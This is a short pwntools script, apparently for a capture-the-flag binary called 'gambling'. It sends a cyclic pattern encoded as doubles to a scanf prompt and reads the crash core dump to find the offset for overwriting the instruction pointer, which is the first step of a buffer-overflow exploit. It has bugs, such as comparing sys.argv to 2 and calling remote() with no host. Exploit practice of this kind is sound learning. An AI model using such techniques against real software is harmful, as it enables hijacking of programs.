#!/bin/python3

from pwn import *
import sys


if sys.argv == 2:
    p = remote()
else :
    elf = context.binary = ELF("./gambling")
    context.log_level  = 'debug'

    p = process()

"""
# Generate cyclic pattern
pattern = cyclic(500)

# Now we need to interpret bytes as doubles
# scanf with %lf expects double (8 bytes)
# So split pattern into 8-byte chunks
numbers = []
for i in range(0, len(pattern), 8):
    chunk = pattern[i:i+8]
    if len(chunk) < 8:
        chunk = chunk.ljust(8, b'\x00')  # pad if needed
    num = u64(chunk)  # unpack as 64-bit little endian
    double = struct.unpack('d', p64(num))[0]  # interpret those bytes as a double
    numbers.append(double)

# Send the numbers
p.sendlineafter('Enter your lucky numbers:', ' '.join(map(str, numbers[:7])))  # send first 7 doubles

# Wait for crash
p.wait()

# Core dump
core = p.corefile

# Get RIP
rip_value = core.rip
print(f"[+] RIP at crash: {hex(rip_value)}")

# Find offset
offset = cyclic_find(rip_value)
print(f"[+] Offset to RIP: {offset}")
"""
pattern = cyclic(200)
doubles = []
for i in range(0, len(pattern), 8):
    chunk = pattern[i:i+8]
    # pad to 8 bytes if needed
    if len(chunk) < 8:
        chunk = chunk.ljust(8, b'\x00')
    # reinterpret raw bytes as a double
    val = struct.unpack('d', chunk)[0]
    doubles.append(val)

log.info(f"Input - {doubles}")


# 4) send exactly 7 doubles, scanf("%lf" ×7)
p.sendlineafter('Enter your lucky numbers:', ' '.join(str(d) for d in doubles[:7]))

# 5) wait for the SIGSEGV
p.wait()

# 6) open the core, read EIP, and compute the offset
core = p.corefile
eip_value = core.eip
log.success(f"EIP at crash: {hex(eip_value)}")

offset = cyclic_find(eip_value)
log.success(f"Offset to EIP = {offset}")
